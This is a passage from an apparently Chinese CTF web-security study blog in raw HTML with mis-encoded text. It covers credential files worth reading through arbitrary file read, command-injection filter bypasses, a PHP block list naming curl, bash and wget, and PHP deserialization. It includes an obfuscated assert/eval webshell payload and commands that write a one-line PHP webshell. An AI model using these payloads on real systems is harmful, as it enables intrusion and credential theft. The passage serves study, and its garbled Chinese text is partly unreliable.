class="comment">#å½“å‰è¿›ç¨‹è¿è¡Œçš„ç¨‹åº</span></span><br><span class="line"><span class="regexp">/proc/</span>cmdline <span class="comment">#ç¨‹åºè¿è¡Œçš„ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="regexp">/proc/</span>cpuset <span class="comment">#dockerç¯å¢ƒå¯ä»¥çœ‹ machine ID</span></span><br><span class="line"><span class="regexp">/proc/</span>cgroup <span class="comment">#dockerç¯å¢ƒå…¨æ˜¯ machine ID ä¸å¸¸ç”¨</span></span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh/known_hosts</span><br><span class="line"><span class="regexp">/root/</span>.bash_history</span><br><span class="line"><span class="regexp">/root/</span>.mysql_history</span><br></pre></td></tr></table></figure>

<p>CTFä¸­flagçš„è·¯å¾„å¸¸è§è¯»å–ï¼Œçˆ†ç ´æµ‹è¯•å­—å…¸</p>
<blockquote>
<p><a href="https://github.com/ev0A/ArbitraryFileReadList/">ev0A&#x2F;ArbitraryFileReadList: CTFä¸­ä»»æ„æ–‡ä»¶è¯»å–çš„fuzzåˆ—è¡¨ (Arbitrary file read fuzz list in CTF) (github.com)</a></p>
</blockquote>
<h2 id="å…«ã€é€»è¾‘æ¼æ´"><a href="#å…«ã€é€»è¾‘æ¼æ´" class="headerlink" title="å…«ã€é€»è¾‘æ¼æ´"></a>å…«ã€é€»è¾‘æ¼æ´</h2><blockquote>
<p>ä¸€èˆ¬åœ¨æ”¯ä»˜è´­ä¹°å¤„ä»£ç ï¼Œå¯¹æ•°æ®å¤„ç†å‡ºç°é€»è¾‘é”™è¯¯ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå¯¼è‡´é€»è¾‘æ¼æ´ï¼Œä½¿å¾—ç”¨æˆ·è·å–ä¸å±äºä»–çš„æƒé™æˆ–è€…ä¿¡æ¯å†…å®¹</p>
</blockquote>
<h2 id="ä¹ã€å‘½ä»¤æ‰§è¡Œ"><a href="#ä¹ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¹ã€å‘½ä»¤æ‰§è¡Œ"></a>ä¹ã€å‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰"><a href="#1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰" class="headerlink" title="1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:"></a>1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:</h3><blockquote>
<p><code>1ï¼‰command1 ; command2 ç”¨;éš”å¼€è¡¨ç¤ºä¸ºå¤šä¸ªå‘½ä»¤ï¼Œå‘½ä»¤æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰§è¡Œï¼Œå½¼æ­¤æ— å…³è”ï¼Œæ‰€æœ‰çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œã€‚å…ˆæ‰§è¡Œ command1 åæ‰§è¡Œ command2</code></p>
<p><code>2ï¼‰command1 &amp;&amp; command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºçœŸï¼Œå†æ‰§è¡Œ command2</code></p>
<p><code>3ï¼‰command1 | command2 å°†ä¸¤ä¸ªå‘½ä»¤åˆ†å¼€ï¼Œå·¦è¾¹å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œåªæ‰§è¡Œ command2</code></p>
<p><code>4ï¼‰command1 &amp; command2 &amp;è¡¨ç¤ºä»»åŠ¡åå°æ‰§è¡Œï¼Œä¸nohupå‘½ä»¤åŠŸèƒ½å·®ä¸å¤šï¼Œå…ˆæ‰§è¡Œ command2 åæ‰§è¡Œ command1</code></p>
<p><code>5ï¼‰command1 || command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºå‡ï¼Œå†æ‰§è¡Œ command2</code></p>
<p><code>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ| || &amp; &amp;&amp; ç§°ä¸º ç®¡é“ç¬¦ï¼‰</code></p>
</blockquote>
<p>eg:</p>
<p><code>find  / -name &quot;flag* &quot;</code><br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«<code>flag</code>çš„æ–‡ä»¶<br><code>find  / -name &quot; *.txt&quot;</code><br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾åç¼€ä¸º<code>txt</code>çš„æ–‡ä»¶</p>
<h3 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h3><h4 id="1-è¿‡æ»¤cat"><a href="#1-è¿‡æ»¤cat" class="headerlink" title="1.è¿‡æ»¤cat"></a>1.è¿‡æ»¤cat</h4><blockquote>
<p><code>moreï¼Œlessï¼Œheadï¼Œtac</code>éƒ½å¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œè¯»å–</p>
</blockquote>
<h4 id="2-è¿‡æ»¤ç©ºæ ¼"><a href="#2-è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="2.è¿‡æ»¤ç©ºæ ¼"></a>2.è¿‡æ»¤ç©ºæ ¼</h4><blockquote>
<p><code>IFS$9ã€%09ã€&lt;ã€&gt;ã€&lt;&gt;ã€&#123;,&#125;ã€%20ã€$&#123;IFS&#125;ã€$&#123;IFS&#125;</code>æ¥ä»£æ›¿ç©ºæ ¼</p>
</blockquote>
<blockquote>
<p><code>&lt;,&gt;</code>æ˜¯æŠŠå†…å®¹å¯¼å‘æŸä¸ªåœ°æ–¹ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å‘½ä»¤</p>
<p>å¦‚<code>cat&lt;flag.php</code>å°±æ˜¯ç›¸å½“äºï¼ŒæŠŠflag.phpå†…å®¹ç”¨catå‘½ä»¤æ˜¾ç¤ºå‡ºæ¥</p>
<p><code>%09</code>æ˜¯tabé”®ï¼Œå¯ä»¥è¡¥å…¨å†…å®¹</p>
<p>æ¯”å¦‚è¿‡æ»¤äº†flagï¼Œä½†æ˜¯éœ€è¦è®¿é—®<code>flag233.php</code></p>
<p>é‚£ä¹ˆå°±å¯ä»¥<code>cat %09*233.php</code>ï¼Œå°±å¯ä»¥äº†</p>
</blockquote>
<h4 id="3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h4><blockquote>
<p>ä¹Ÿå°±æ˜¯&#x2F;ä¸èƒ½ç”¨äº†ï¼Œä¸èƒ½ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç›®å½•</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>å¯ä»¥<strong>åˆ©ç”¨åˆ†å·ä½¿ä¸¤ä¸ªå‘½ä»¤åŒæ—¶è¿›è¡Œ</strong>ä¹Ÿå°±æ˜¯</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
</blockquote>
<h4 id="4-è¿‡æ»¤è¿ç®—ç¬¦"><a href="#4-è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="4.è¿‡æ»¤è¿ç®—ç¬¦"></a>4.è¿‡æ»¤è¿ç®—ç¬¦</h4><p>å¯ä»¥ç”¨<code>;</code>ä»£æ›¿ç®¡é“è¿ç®—ç¬¦</p>
<h4 id="5-ç»•è¿‡æ­£åˆ™åŒ¹é…"><a href="#5-ç»•è¿‡æ­£åˆ™åŒ¹é…" class="headerlink" title="5.ç»•è¿‡æ­£åˆ™åŒ¹é…"></a>5.ç»•è¿‡æ­£åˆ™åŒ¹é…</h4><p>æ¯”å¦‚</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p><code>æ‰€æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤</code></p>
<p>è¿™é‡Œå°±éœ€è¦</p>
<h5 id="æ³•1ï¼šå–åç»•è¿‡ï¼š"><a href="#æ³•1ï¼šå–åç»•è¿‡ï¼š" class="headerlink" title="æ³•1ï¼šå–åç»•è¿‡ï¼š"></a>æ³•1ï¼šå–åç»•è¿‡ï¼š</h5><p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p>
<p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</p>
</blockquote>
<p>ç„¶åå†èµ‹å€¼</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨æ„åé¢è¦æœ‰<code>;</code>ä»£è¡¨phpä»£ç ç»“æŸ<br>è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å<br>ç­‰åŒäº</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span>=(<span class="meta">assert</span>)(eval($_REQUEST[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure>

<p>(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸º<code>æ–­è¨€(eval($_REQUEST[8]))</code>ï¼Œæ‰€ä»¥æŠŠ<code>eval($_REQUEST[8])</code>å½“ä½œ<code>php</code>æ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°<code>shell</code>äº†</p>
</blockquote>
<p>èšå‰‘è¿æ¥</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h5 id="æ³•2ï¼šå¼‚æˆ–ç»•è¿‡"><a href="#æ³•2ï¼šå¼‚æˆ–ç»•è¿‡" class="headerlink" title="æ³•2ï¼šå¼‚æˆ–ç»•è¿‡:"></a>æ³•2ï¼šå¼‚æˆ–ç»•è¿‡:</h5><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br> ä¾‹å¦‚ï¼šå¼‚æˆ– <code>?</code> å’Œ <code>~</code> ä¹‹åå¾—åˆ°çš„æ˜¯ <code>A</code></p>
<blockquote>
<p>å­—ç¬¦ï¼š?         ASCIIç ï¼š63           äºŒè¿›åˆ¶ï¼š  00â€­11 1111â€¬<br>å­—ç¬¦ï¼š~         ASCIIç ï¼š126          äºŒè¿›åˆ¶ï¼š  0111 1110â€¬<br>å¼‚æˆ–è§„åˆ™ï¼š<br>1   XOR   0   &#x3D;   1<br>0   XOR   1   &#x3D;   1<br>0   XOR   0   &#x3D;   0<br>1   XOR   1   &#x3D;   0<br>ä¸Šè¿°ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ° äºŒè¿›åˆ¶ï¼š  0100 0001<br>è¯¥äºŒè¿›åˆ¶çš„åè¿›åˆ¶ä¹Ÿå°±æ˜¯ï¼š65<br>å¯¹åº”çš„ASCIIç æ˜¯ï¼šA</p>
</blockquote>
<p>æœ¬é¢˜preg_replace()è¿‡æ»¤äº†<code>æ‰€æœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—</code>ï¼Œä½†æ˜¯<em>ASCIIç ä¸­è¿˜æœ‰å¾ˆå¤š<code>å­—æ¯æ•°å­—ä¹‹å¤–çš„å­—ç¬¦</code>ï¼Œåˆ©ç”¨è¿™äº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</em></p>
<blockquote>
<p>PSï¼šå–ASCIIè¡¨ç§éå­—æ¯æ•°å­—çš„å…¶ä»–å­—ç¬¦ï¼Œè¦æ³¨æ„æœ‰äº›å­—ç¬¦å¯èƒ½ä¼šå½±å“æ•´ä¸ªè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥è¦å»æ‰å¦‚ï¼šåå¼•å·ï¼Œå•å¼•å·</p>
</blockquote>
<h5 id="æ³•3ï¼šåæ–œæ -è½¬ä¹‰ç»•è¿‡"><a href="#æ³•3ï¼šåæ–œæ -è½¬ä¹‰ç»•è¿‡" class="headerlink" title="æ³•3ï¼šåæ–œæ \è½¬ä¹‰ç»•è¿‡"></a>æ³•3ï¼šåæ–œæ \è½¬ä¹‰ç»•è¿‡</h5><p>å¯¹äº</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨è¿™ä¸ªæ­£åˆ™åŒ¹é…ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤åæ–œæ <code>\</code></p>
<p>æ‰€ä»¥è™½ç„¶æˆ‘ä»¬æ‰§è¡Œ<code>ls</code>ä¹‹ç±»ä¼šè¢«è¿‡æ»¤ï¼Œä½†æ˜¯æ‰§è¡Œ<code>l\s</code>æ—¶ï¼Œä¼šç»•è¿‡<code>ls</code>çš„åŒ¹é…ï¼Œä½†æ˜¯ä»ç„¶èƒ½å®ç°<code>ls</code>çš„åŠŸèƒ½</p>
<p>å¯¹äºæ–‡ä»¶åæ¯”å¦‚<code>php</code>è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥ç”¨åä¹‰å­—ç¬¦<code>p\ph</code>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ç»•è¿‡</p>
</blockquote>
<h4 id="6-ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#6-ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="6.ç»•è¿‡é•¿åº¦é™åˆ¶"></a>6.ç»•è¿‡é•¿åº¦é™åˆ¶</h4><p><code>&gt;</code>å’Œ<code>&gt;&gt;</code>ä¸¤ä¸ªç¬¦å·çš„ä½¿ç”¨</p>
<blockquote>
<p>ä½¿ç”¨<code>&gt;</code>å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œå¦‚æœæ˜¯å­˜å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šæ–°å»ºæ–‡ä»¶å†å­˜å…¥</p>
</blockquote>
<p><img src="/post/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></p>
<blockquote>
<p><code>&gt;&gt;</code>ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</p>
</blockquote>
<p><img src="/post/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></p>
<h4 id="2-å¸¸ç”¨å‘½ä»¤"><a href="#2-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="2.å¸¸ç”¨å‘½ä»¤"></a>2.å¸¸ç”¨å‘½ä»¤</h4><blockquote>
<p>ls</p>
<p>cat</p>
<p>touch</p>
<p>#åˆ›å»ºæ–‡ä»¶ï¼Œä¸€èˆ¬åˆ›å»ºè„šæœ¬æ–‡ä»¶ï¼Œ</p>
<p>æ¯”å¦‚<code>touch haha.php</code></p>
<p>ç„¶åå†æ‰§è¡Œ</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>

<p>ï¼Œåœ¨è„šæœ¬æ–‡ä»¶é‡Œå†™ä¸€ä¸²ä¸€å¥è¯æœ¨é©¬</p>
<p><strong>ä½†æ˜¯æ³¨æ„å› ä¸ºæœ‰$ï¼Œåé¢çš„çœ‹å¯èƒ½ä¼šè¢«å½“åšå˜é‡ï¼Œæ‰€ä»¥å¯ä»¥åŠ ä¸Šåæ–œæ \è½¬ä¹‰</strong></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="åã€æš´åŠ›ç ´è§£"><a href="#åã€æš´åŠ›ç ´è§£" class="headerlink" title="åã€æš´åŠ›ç ´è§£"></a>åã€æš´åŠ›ç ´è§£</h2><blockquote>
<p>ä¸€æŠŠæœå“ˆå°±å®Œäº‹ï¼ˆå¥¸ç¬‘ï¼‰</p>
</blockquote>
<h2 id="åä¸€ã€ååºåˆ—åŒ–æ¼æ´ï¼ˆPHPï¼‰"><a href="#åä¸€ã€ååºåˆ—åŒ–æ¼æ´ï¼ˆPHPï¼‰" class="headerlink" title="åä¸€ã€ååºåˆ—åŒ–æ¼æ´ï¼ˆPHPï¼‰"></a>åä¸€ã€ååºåˆ—åŒ–æ¼æ´ï¼ˆPHPï¼‰</h2><blockquote>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">åŸæ–‡é“¾æ¥1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/377676274">åŸæ–‡é“¾æ¥2</a></p>
</blockquote>
<h3 id="åºåˆ—åŒ–ï¼š"><a href="#åºåˆ—åŒ–ï¼š" class="headerlink" title="åºåˆ—åŒ–ï¼š"></a>åºåˆ—åŒ–ï¼š</h3><blockquote>
<p><strong>åºåˆ—åŒ–</strong>(Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</p>
</blockquote>
<h3 id="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><blockquote>
<p>æ¦‚å¿µï¼š<code>phpçš„åºåˆ—åŒ–å°†å¯¹è±¡è½¬åŒ–ä¸ºäº†å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†å¯¹è±¡çš„æ‰€æœ‰æ•°æ®ä¿¡æ¯ï¼Œ</code><br><code>ååºåˆ—åŒ–æ—¶å†æ ¹æ®è¿™äº›ä¿¡æ¯è¿˜åŸå¯¹è±¡ã€‚</code></p>
<p><u>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç”±</u></p>
<p><u>serialize()å’Œunserialize()</u></p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°æ¥å®Œæˆã€‚</p>
<p>serialize()å®Œæˆåºåˆ—åŒ–çš„æ“ä½œï¼Œå°†ä¼ å…¥çš„å€¼è½¬æ¢ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼›</p>
<p>è€Œunserialize()å®Œæˆååºåˆ—åŒ–çš„æ“ä½œï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢æˆåŸæ¥çš„å˜é‡ã€‚</p>
<p><code>serialize(mixed $value): string</code><br>serialize()è¿”å›å­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹ï¼š</p>
<p>O::â€â€::{&lt;field name 1&gt;&lt;field value 1&gt;â€¦}</p>
</blockquote>
<p><img src="/post/Web-study/image-20230502195813375.png" alt="image-20230502195813375"></p>
<p>â€ƒâ€ƒ</p>
<blockquote>
<p>å½“åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° sleep()ã€‚è¿™æ ·å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œã€‚ç±»ä¼¼çš„ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ã€‚<br><code>unserialize(string $str): mixed</code><br>â€ƒâ€ƒunserialize()å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› PHP çš„å€¼ã€‚<br>è‹¥è¢«ååºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸåœ°é‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHP ä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ã€‚</p>
</blockquote>
<p>æ³¨æ„ï¼š</p>
<p><code>privateå£°æ˜</code></p>
<blockquote>
<p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚</p>
<p>å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</p>
<p>%00ä¹Ÿå°±æ˜¯ç©ºå­—ç¬¦ï¼Œæ— æ³•å¤åˆ¶ï¼Œåªèƒ½è‡ªå·±ä¿®æ”¹äºŒè¿›åˆ¶ï¼Œæˆ–è€…è‡ªå·±åŠ ä¸Š</p>
</blockquote>
<h3 id="phpé­”æœ¯æ–¹æ³•"><a href="#phpé­”æœ¯æ–¹æ³•" class="headerlink" title="phpé­”æœ¯æ–¹æ³•"></a>phpé­”æœ¯æ–¹æ³•</h3><blockquote>
<p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">åŸæ–‡é“¾æ¥</a></p>
</blockquote>
<p>â€ƒPHPä¸­ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„æ–¹æ³•ï¼Œ</p>
<blockquote>
<p><code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()ï¼Œ__autoload()</code></p>
</blockquote>
<p>è¢«ç§°ä¸ºâ€é­”æœ¯æ–¹æ³•â€ï¼ˆMagic methodsï¼‰ã€‚è¿™äº›æ–¹æ³•åœ¨ä¸€å®šæ¡ä»¶ä¸‹æœ‰ç‰¹æ®Šçš„åŠŸèƒ½ï¼Œåœ¨<code>å‘½åè‡ªå·±çš„ç±»æ–¹æ³•æ—¶ä¸èƒ½ä½¿ç”¨è¿™äº›æ–¹æ³•å</code>ï¼Œé™¤éæ˜¯æƒ³ä½¿ç”¨å…¶é­”æœ¯åŠŸèƒ½</p>
<p>ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é­”æœ¯æ–¹æ³•ä¸»è¦æ˜¯ï¼š</p>
<blockquote>
<p>__construct()	&#x2F;&#x2F;å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</p>
<p>__destruct() 	&#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p>
<p>__wakeup() 	&#x2F;&#x2F;ä½¿ç”¨unserializeæ—¶è§¦å‘</p>
<p>__sleep() 	&#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘</p>
